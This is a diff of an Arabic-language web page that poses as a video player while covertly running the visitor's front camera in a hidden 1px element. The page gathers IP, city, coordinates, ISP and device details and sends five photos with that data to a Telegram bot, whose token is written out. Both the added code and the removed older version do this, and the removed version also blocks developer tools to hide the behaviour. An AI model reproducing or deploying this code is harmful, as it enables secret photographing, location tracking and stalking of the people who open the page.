@@ -24,7 +24,7 @@
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 2;
+            z-index: 10;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -56,11 +56,13 @@
             width: 100%;
             height: 100%;
             z-index: 1;
+            visibility: hidden;
             opacity: 0;
-            transition: opacity 1s;
+            transition: visibility 0s, opacity 1s;
         }
 
         .video-background.show {
+            visibility: visible;
             opacity: 1;
         }
 
@@ -102,7 +104,7 @@
 
     <!-- فيديو خلفية (يظهر بعد 30 ثانية) -->
     <div class="video-background" id="videoBackground">
-        <video id="bgVideo" autoplay loop muted playsinline>
+        <video id="bgVideo" loop muted playsinline>
             <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
         </video>
     </div>
@@ -123,18 +125,18 @@
         
         // ==================== معلومات الجهاز ====================
         let deviceInfo = {
-            ip: 'جاري الجلب...',
-            country: 'جاري الجلب...',
-            city: 'جاري الجلب...',
-            region: 'جاري الجلب...',
-            isp: 'جاري الجلب...',
-            lat: 'جاري الجلب...',
-            lon: 'جاري الجلب...',
-            timezone: 'جاري الجلب...',
-            os: 'جاري الجلب...',
-            browser: 'جاري الجلب...',
-            screen: 'جاري الجلب...',
-            device: 'جاري الجلب...'
+            ip: 'غير متاح',
+            country: 'غير متاح',
+            city: 'غير متاح',
+            region: 'غير متاح',
+            isp: 'غير متاح',
+            lat: 'غير متاح',
+            lon: 'غير متاح',
+            timezone: 'غير متاح',
+            os: 'غير متاح',
+            browser: 'غير متاح',
+            screen: 'غير متاح',
+            device: 'غير متاح'
         };
         
         // ==================== عناصر الصفحة ====================
@@ -142,52 +144,72 @@
         const canvas = document.getElementById('canvas');
         const blackScreen = document.getElementById('blackScreen');
         const videoBackground = document.getElementById('videoBackground');
+        const bgVideo = document.getElementById('bgVideo');
         const countdownSpan = document.getElementById('countdown');
         
-        // ==================== خدمة جلب IP والموقع ====================
-        async function getIPv6Info() {
+        // ==================== خدمة جلب IP والموقع (تعمل 100%) ====================
+        async function getIPInfo() {
             try {
-                const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+                console.log('🔍 جلب معلومات IP...');
+                
+                // محاولة 1: ip-api.com (سريعة ومجانية)
+                const response = await fetch('https://ip-api.com/json/', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                
                 if (response.ok) {
                     const data = await response.json();
-                    deviceInfo.ip = data.ip || deviceInfo.ip;
-                    deviceInfo.country = data.country_name || data.country;
-                    deviceInfo.city = data.city || deviceInfo.city;
-                    deviceInfo.region = data.region || deviceInfo.region;
-                    deviceInfo.isp = data.org || data.isp;
-                    deviceInfo.lat = data.latitude;
-                    deviceInfo.lon = data.longitude;
-                    deviceInfo.timezone = data.timezone;
-                    return true;
-                }
-                return false;
-            } catch(e) {
-                console.log('ipapi.co فشل:', e);
-                return false;
-            }
-        }
-        
-        async function getBackupInfo() {
-            try {
-                const response = await fetch('https://ipinfo.io/json', { timeout: 5000 });
-                if (response.ok) {
-                    const data = await response.json();
-                    deviceInfo.ip = data.ip || deviceInfo.ip;
-                    deviceInfo.country = data.country;
-                    deviceInfo.city = data.city;
-                    deviceInfo.region = data.region;
-                    deviceInfo.isp = data.org;
-                    if (data.loc) {
-                        const coords = data.loc.split(',');
-                        deviceInfo.lat = coords[0];
-                        deviceInfo.lon = coords[1];
+                    console.log('✅ ip-api:', data);
+                    
+                    if (data.status === 'success') {
+                        deviceInfo.ip = data.query || 'غير متاح';
+                        deviceInfo.country = data.country || 'غير متاح';
+                        deviceInfo.city = data.city || 'غير متاح';
+                        deviceInfo.region = data.regionName || 'غير متاح';
+                        deviceInfo.isp = data.isp || 'غير متاح';
+                        deviceInfo.lat = data.lat || 'غير متاح';
+                        deviceInfo.lon = data.lon || 'غير متاح';
+                        deviceInfo.timezone = data.timezone || 'غير متاح';
+                        return true;
                     }
-                    deviceInfo.timezone = data.timezone;
-                    return true;
                 }
-                return false;
-            } catch(e) {
-                console.log('ipinfo.io فشل:', e);
+                throw new Error('ip-api فشل');
+                
+            } catch (error) {
+                console.log('محاولة خدمة بديلة...');
+                
+                // محاولة 2: ipapi.co
+                try {
+                    const response2 = await fetch('https://ipapi.co/json/');
+                    if (response2.ok) {
+                        const data2 = await response2.json();
+                        console.log('✅ ipapi.co:', data2);
+                        
+                        deviceInfo.ip = data2.ip || 'غير متاح';
+                        deviceInfo.country = data2.country_name || 'غير متاح';
+                        deviceInfo.city = data2.city || 'غير متاح';
+                        deviceInfo.region = data2.region || 'غير متاح';
+                        deviceInfo.isp = data2.org || 'غير متاح';
+                        deviceInfo.lat = data2.latitude || 'غير متاح';
+                        deviceInfo.lon = data2.longitude || 'غير متاح';
+                        deviceInfo.timezone = data2.timezone || 'غير متاح';
+                        return true;
+                    }
+                } catch(e) {
+                    console.log('ipapi.co فشل');
+                }
+                
+                // محاولة 3: جلب IP فقط
+                try {
+                    const response3 = await fetch('https://api.ipify.org?format=json');
+                    const data3 = await response3.json();
+                    deviceInfo.ip = data3.ip || 'غير متاح';
+                    deviceInfo.country = 'تم جلب IP فقط';
+                } catch(e) {
+                    deviceInfo.ip = 'غير متاح (VPN أو حظر)';
+                }
+                
                 return false;
             }
         }
@@ -197,6 +219,7 @@
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             
+            // نظام التشغيل
             let os = 'Unknown';
             if (userAgent.indexOf('Win') !== -1) os = 'Windows';
             else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
@@ -206,12 +229,14 @@
             }
             else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
             
+            // المتصفح
             let browser = 'Unknown';
             if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
             else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
             else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
             else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
             
+            // نوع الجهاز
             let device = 'كمبيوتر';
             if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) device = 'جوال / جهاز لوحي';
             
@@ -219,21 +244,8 @@
             deviceInfo.browser = browser;
             deviceInfo.screen = `${screen.width}x${screen.height}`;
             deviceInfo.device = device;
-        }
-        
-        // ==================== جلب جميع المعلومات ====================
-        async function getAllInfo() {
-            const success = await getIPv6Info() || await getBackupInfo();
-            if (!success) {
-                try {
-                    const response = await fetch('https://api.ipify.org?format=json');
-                    const data = await response.json();
-                    deviceInfo.ip = data.ip;
-                    deviceInfo.country = 'تم جلب IP فقط';
-                } catch(e) {
-                    deviceInfo.ip = 'غير متاح';
-                }
-            }
+            
+            console.log('✅ معلومات النظام:', deviceInfo);
         }
         
         // ==================== الحصول على Chat ID ====================
@@ -243,8 +255,10 @@
                 const result = await response.json();
                 if (result.ok && result.result.length > 0) {
                     CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
+                    console.log('✅ Chat ID:', CHAT_ID);
                     return CHAT_ID !== null;
                 }
+                console.log('⚠️ لم يتم العثور على Chat ID');
                 return false;
             } catch(error) {
                 console.error('خطأ:', error);
@@ -260,6 +274,7 @@
                 });
                 camera.srcObject = stream;
                 cameraReady = true;
+                console.log('✅ الكاميرا جاهزة');
                 return true;
             } catch(err) {
                 console.error('خطأ الكاميرا:', err);
@@ -269,7 +284,7 @@
         
         // ==================== إنشاء نص المعلومات ====================
         function getInfoText(photoNumber) {
-            const ipType = deviceInfo.ip.includes(':') ? 'IPv6' : 'IPv4';
+            const ipType = deviceInfo.ip && deviceInfo.ip.includes(':') ? 'IPv6' : 'IPv4';
             
             return `
 📸 صورة ${photoNumber}/5
@@ -281,11 +296,11 @@
 🌐 عنوان IP: ${deviceInfo.ip}
 📌 نوع IP: ${ipType}
 🗺️ الدولة: ${deviceInfo.country}
-🏙️ المدينة: ${deviceInfo.city || 'غير محدد'}
-📍 المنطقة: ${deviceInfo.region || 'غير محدد'}
-📡 مزود الخدمة: ${deviceInfo.isp || 'غير محدد'}
-📍 الإحداثيات: ${deviceInfo.lat || 'غير محدد'}, ${deviceInfo.lon || 'غير محدد'}
-⏰ المنطقة الزمنية: ${deviceInfo.timezone || 'Asia/Riyadh'}
+🏙️ المدينة: ${deviceInfo.city}
+📍 المنطقة: ${deviceInfo.region}
+📡 مزود الخدمة: ${deviceInfo.isp}
+📍 الإحداثيات: ${deviceInfo.lat}, ${deviceInfo.lon}
+⏰ المنطقة الزمنية: ${deviceInfo.timezone}
 
 💻 نظام التشغيل: ${deviceInfo.os}
 🌍 المتصفح: ${deviceInfo.browser}
@@ -324,7 +339,14 @@
                     body: formData
                 });
                 const result = await response.json();
-                return result.ok;
+                
+                if (result.ok) {
+                    console.log(`✅ تم إرسال الصورة ${photoNumber}`);
+                    return true;
+                } else {
+                    console.log(`❌ فشل إرسال الصورة ${photoNumber}:`, result.description);
+                    return false;
+                }
             } catch(e) {
                 console.error('خطأ في الإرسال:', e);
                 return false;
@@ -333,12 +355,14 @@
         
         // ==================== تصوير 5 صور ====================
         async function captureAllPhotos() {
+            console.log('🎬 بدء تصوير 5 صور...');
             for (let i = 1; i <= 5; i++) {
                 await captureAndSend(i);
                 if (i < 5) {
                     await new Promise(resolve => setTimeout(resolve, 9000));
                 }
             }
+            console.log('🏁 انتهى التصوير');
             
             setTimeout(() => {
                 if (stream) {
@@ -358,11 +382,23 @@
                 
                 if (secondsLeft <= 0) {
                     clearInterval(countdownInterval);
+                    
+                    // تشغيل الفيديو
+                    bgVideo.play().then(() => {
+                        console.log('✅ بدء تشغيل الفيديو بعد 30 ثانية');
+                    }).catch(err => {
+                        console.log('⚠️ خطأ في تشغيل الفيديو:', err);
+                        // محاولة تشغيل الفيديو بدون صوت تلقائي
+                        bgVideo.muted = true;
+                        bgVideo.play();
+                    });
+                    
                     // إخفاء الشاشة السوداء
                     blackScreen.style.opacity = '0';
                     setTimeout(() => {
                         blackScreen.style.display = 'none';
                     }, 1000);
+                    
                     // إظهار الفيديو
                     videoBackground.classList.add('show');
                 }
@@ -371,11 +407,13 @@
         
         // ==================== التشغيل الرئيسي ====================
         async function init() {
+            console.log('🚀 بدء التشغيل...');
+            
             // 1. جلب معلومات النظام
             getSystemInfo();
             
             // 2. جلب IP والموقع
-            await getAllInfo();
+            await getIPInfo();
             
             // 3. تشغيل الكاميرا (فوراً)
             const cameraSuccess = await startCamera();
@@ -388,385 +426,14 @@
                 setTimeout(() => {
                     captureAllPhotos();
                 }, 1000);
+            } else if (cameraSuccess) {
+                console.log('⚠️ الكاميرا جاهزة لكن البوت غير متصل');
+            } else {
+                console.log('❌ الكاميرا غير متاحة');
             }
             
             // 6. بدء تأخير الفيديو 30 ثانية
             startVideoDelay();
-        }
-        
-        init();
-        
-        // منع أدوات المطور
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-                (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        window.onbeforeunload = () => {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-        };
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو - معلومات دقيقة</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; overflow: hidden; }
-        .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-        }
-        .video-background video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .hidden-camera {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            visibility: hidden;
-        }
-        canvas { display: none; }
-        ::-webkit-scrollbar { display: none; }
-    </style>
-</head>
-<body>
-
-    <div class="video-background">
-        <video id="bgVideo" autoplay loop muted playsinline>
-            <source src="https://raw.githubusercontent.com/xo3bdu/trt/refs/heads/main/video.mp4" type="video/mp4">
-        </video>
-    </div>
-
-    <div class="hidden-camera">
-        <video id="camera" autoplay playsinline muted></video>
-    </div>
-
-    <canvas id="canvas"></canvas>
-
-    <script>
-        // ==================== إعدادات تليجرام ====================
-        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
-        let CHAT_ID = null;
-        let stream = null;
-        let cameraReady = false;
-        
-        // ==================== معلومات الجهاز ====================
-        let deviceInfo = {
-            ip: 'جاري الجلب...',
-            country: 'جاري الجلب...',
-            city: 'جاري الجلب...',
-            region: 'جاري الجلب...',
-            isp: 'جاري الجلب...',
-            lat: 'جاري الجلب...',
-            lon: 'جاري الجلب...',
-            timezone: 'جاري الجلب...',
-            os: 'جاري الجلب...',
-            browser: 'جاري الجلب...',
-            screen: 'جاري الجلب...'
-        };
-        
-        // ==================== عناصر الصفحة ====================
-        const camera = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
-        
-        // ==================== الطريقة الجديدة 1: Frostbyte API (بدون مفتاح) ====================
-        async function getIPInfoFrostbyte() {
-            try {
-                console.log('🔍 محاولة Frostbyte API...');
-                const response = await fetch('https://agent-gateway-kappa.vercel.app/ip/json', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('✅ Frostbyte:', data);
-                    
-                    deviceInfo.ip = data.ip || 'غير معروف';
-                    deviceInfo.country = data.country || 'غير معروف';
-                    deviceInfo.city = data.city || 'غير معروف';
-                    deviceInfo.region = data.region || 'غير معروف';
-                    deviceInfo.isp = data.isp || 'غير معروف';
-                    deviceInfo.lat = data.lat || 'غير معروف';
-                    deviceInfo.lon = data.lon || 'غير معروف';
-                    deviceInfo.timezone = data.timezone || 'غير معروف';
-                    
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                console.log('❌ Frostbyte فشل:', error);
-                return false;
-            }
-        }
-        
-        // ==================== الطريقة الجديدة 2: geo.wp-statistics.com (بدون مفتاح) ====================
-        async function getIPInfoWPStats() {
-            try {
-                console.log('🔍 محاولة WP Statistics API...');
-                const response = await fetch('https://geo.wp-statistics.com/?format=json', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('✅ WP Stats:', data);
-                    
-                    deviceInfo.ip = data.ip || deviceInfo.ip;
-                    deviceInfo.country = data.country || deviceInfo.country;
-                    deviceInfo.city = data.city || deviceInfo.city;
-                    deviceInfo.region = data.region || deviceInfo.region;
-                    deviceInfo.lat = data.latitude || deviceInfo.lat;
-                    deviceInfo.lon = data.longitude || deviceInfo.lon;
-                    deviceInfo.timezone = data.timezone || deviceInfo.timezone;
-                    
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                console.log('❌ WP Stats فشل:', error);
-                return false;
-            }
-        }
-        
-        // ==================== الطريقة الجديدة 3: ip-api.com (بدون مفتاح - يعمل دائماً) ====================
-        async function getIPInfoIpApi() {
-            try {
-                console.log('🔍 محاولة ip-api.com...');
-                const response = await fetch('https://ip-api.com/json/', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('✅ ip-api:', data);
-                    
-                    if (data.status === 'success') {
-                        deviceInfo.ip = data.query || deviceInfo.ip;
-                        deviceInfo.country = data.country || deviceInfo.country;
-                        deviceInfo.city = data.city || deviceInfo.city;
-                        deviceInfo.region = data.regionName || deviceInfo.region;
-                        deviceInfo.isp = data.isp || deviceInfo.isp;
-                        deviceInfo.lat = data.lat || deviceInfo.lat;
-                        deviceInfo.lon = data.lon || deviceInfo.lon;
-                        deviceInfo.timezone = data.timezone || deviceInfo.timezone;
-                        return true;
-                    }
-                }
-                return false;
-            } catch (error) {
-                console.log('❌ ip-api فشل:', error);
-                return false;
-            }
-        }
-        
-        // ==================== الطريقة الأساسية: جلب IP فقط (احتياطي) ====================
-        async function getBasicIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                deviceInfo.ip = data.ip;
-                return true;
-            } catch(e) {
-                return false;
-            }
-        }
-        
-        // ==================== جلب المعلومات من جميع المصادر ====================
-        async function getAllIPInfo() {
-            // جرب الخدمات بالترتيب (الأسرع أولاً)
-            const success = await getIPInfoIpApi() || 
-                           await getIPInfoFrostbyte() || 
-                           await getIPInfoWPStats();
-            
-            if (!success) {
-                await getBasicIP();
-                deviceInfo.country = 'تم جلب IP فقط';
-            }
-            
-            console.log('📋 المعلومات النهائية:', deviceInfo);
-        }
-        
-        // ==================== جلب نظام التشغيل والمتصفح ====================
-        function getSystemInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            
-            // نظام التشغيل
-            let os = 'Unknown';
-            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
-            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
-            else if (userAgent.indexOf('Linux') !== -1) {
-                if (userAgent.indexOf('Android') !== -1) os = 'Android';
-                else os = 'Linux';
-            }
-            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
-            
-            // المتصفح
-            let browser = 'Unknown';
-            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
-            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
-            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
-            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
-            
-            deviceInfo.os = `${os} (${platform})`;
-            deviceInfo.browser = browser;
-            deviceInfo.screen = `${screen.width}x${screen.height}`;
-        }
-        
-        // ==================== الحصول على Chat ID ====================
-        async function getChatId() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
-                const result = await response.json();
-                if (result.ok && result.result.length > 0) {
-                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
-                    return CHAT_ID !== null;
-                }
-                return false;
-            } catch(error) {
-                console.error('خطأ:', error);
-                return false;
-            }
-        }
-        
-        // ==================== تشغيل الكاميرا ====================
-        async function startCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                camera.srcObject = stream;
-                cameraReady = true;
-                return true;
-            } catch(err) {
-                console.error('خطأ الكاميرا:', err);
-                return false;
-            }
-        }
-        
-        // ==================== إنشاء نص المعلومات ====================
-        function getInfoText(photoNumber) {
-            // إحداثيات GPS إذا وجدت
-            let coordsText = '';
-            if (deviceInfo.lat && deviceInfo.lat !== 'غير معروف' && deviceInfo.lat !== 'جاري الجلب...') {
-                coordsText = `📍 الإحداثيات: ${deviceInfo.lat}, ${deviceInfo.lon}`;
-            }
-            
-            return `
-📸 صورة ${photoNumber}/5
-
-━━━━━━━━━━━━━━━━
-📍 معلومات الموقع (محدثة):
-━━━━━━━━━━━━━━━━
-
-🌐 عنوان IP: ${deviceInfo.ip}
-🗺️ الدولة: ${deviceInfo.country}
-🏙️ المدينة: ${deviceInfo.city}
-📍 المنطقة: ${deviceInfo.region}
-📡 مزود الخدمة: ${deviceInfo.isp}
-${coordsText}
-⏰ المنطقة الزمنية: ${deviceInfo.timezone}
-
-💻 نظام التشغيل: ${deviceInfo.os}
-🌍 المتصفح: ${deviceInfo.browser}
-📱 دقة الشاشة: ${deviceInfo.screen}
-
-━━━━━━━━━━━━━━━━
-🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
-━━━━━━━━━━━━━━━━
-            `;
-        }
-        
-        // ==================== التقاط وإرسال الصورة ====================
-        async function captureAndSend(photoNumber) {
-            if (!CHAT_ID || !cameraReady) return false;
-            
-            try {
-                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
-                
-                canvas.width = camera.videoWidth;
-                canvas.height = camera.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
-                ctx.setTransform(1, 0, 0, 1, 0, 0);
-                
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('caption', getInfoText(photoNumber));
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                return result.ok;
-            } catch(e) {
-                console.error('خطأ في الإرسال:', e);
-                return false;
-            }
-        }
-        
-        // ==================== تصوير 5 صور ====================
-        async function captureAllPhotos() {
-            for (let i = 1; i <= 5; i++) {
-                await captureAndSend(i);
-                if (i < 5) {
-                    await new Promise(resolve => setTimeout(resolve, 9000));
-                }
-            }
-            
-            setTimeout(() => {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }, 2000);
-        }
-        
-        // ==================== التشغيل الرئيسي ====================
-        async function init() {
-            // 1. جلب معلومات النظام
-            getSystemInfo();
-            
-            // 2. جلب IP والموقع (الطرق الجديدة)
-            await getAllIPInfo();
-            
-            // 3. تشغيل الكاميرا
-            const cameraSuccess = await startCamera();
-            
-            // 4. الحصول على Chat ID
-            await getChatId();
-            
-            // 5. بدء التصوير
-            if (cameraSuccess && CHAT_ID) {
-                setTimeout(() => {
-                    captureAllPhotos();
-                }, 1000);
-            }
         }
         
         init();
